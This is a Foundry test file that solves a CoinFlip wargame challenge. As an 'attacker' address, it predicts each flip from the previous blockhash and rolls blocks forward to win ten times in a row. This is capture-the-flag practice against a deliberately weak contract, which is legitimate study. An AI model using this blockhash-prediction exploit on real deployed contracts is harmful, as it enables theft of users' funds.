// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/CoinFlip.sol";



contract CoinFlipTest is Test{
    CoinFlip instanceAddress;
    address coinflip;
    

    address attacker = mkaddr("attacker");

    function setUp() public{
        instanceAddress = new CoinFlip();
        //interacting with the instance contract
        coinflip = address(CoinFlip(instanceAddress));
    }
      
    function testHackCoinFlip() public {
        vm.startPrank(attacker);
        uint8 consecutiveLimit = 10;
       
        uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

        
        for(uint256 i = 0; i < consecutiveLimit; i += 1){
            uint256 blockValue = uint256(blockhash(block.number - 1));
            uint256 coinFlip = uint256(blockValue / FACTOR);
            
            assertEq(instanceAddress.flip(coinFlip == 1 ? true : false), true );

            if(instanceAddress.consecutiveWins() == consecutiveLimit){
                break;
            }
            // move block.number forward by 1 
            uint256 targetBlock = block.number + 1;
            vm.roll(targetBlock);
        }
       
        vm.stopPrank();

    }


    function mkaddr(string memory name) public returns (address) {
        address addr = address(
            uint160(uint256(keccak256(abi.encodePacked(name))))
        );
        vm.label(addr, name);
        return addr;
    }
}